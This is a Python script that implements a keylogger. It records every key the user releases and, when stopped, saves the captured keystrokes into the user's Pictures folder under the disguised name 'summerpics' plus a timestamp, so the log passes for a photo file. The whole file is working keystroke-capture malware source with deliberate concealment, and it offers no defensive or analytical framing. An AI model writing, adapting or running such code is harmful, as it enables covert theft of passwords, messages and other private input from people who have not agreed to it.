import os
import keyboard
import sys
module_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), 'keyboard_module'))
sys.path.insert(0, module_dir)
import keyboard
from datetime import datetime
from shutil import copyfile

class Keylogger:
    def __init__(self):
        self.log = ""
        self.start_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g., ctrl, alt, etc.)
            if name == "space":
                name = " "
            elif name == "enter":
                name = "\n"
            else:
                name = f"[{name.upper()}]"

        self.log += name

    def update_filename(self):
        start_dt_str = self.start_dt.strftime("%Y-%m-%d_%H-%M-%S")
        self.filename = f"summerpics_{start_dt_str}.txt"

    def report_to_file(self):
        self.update_filename()  # Update the filename first
        pictures_dir = os.path.expanduser('~/Pictures')
        log_path = os.path.join(pictures_dir, self.filename)
        
        with open(log_path, "w") as f:
            f.write(self.log)
        
        print(f"[+] Saved {self.filename} in {pictures_dir}")

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        print(f"{datetime.now()} - Started keylogger. Press Ctrl+C to stop.")

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("Keylogger stopped.")
        keylogger.report_to_file()
        print("Log file saved as 'summerpics'.")
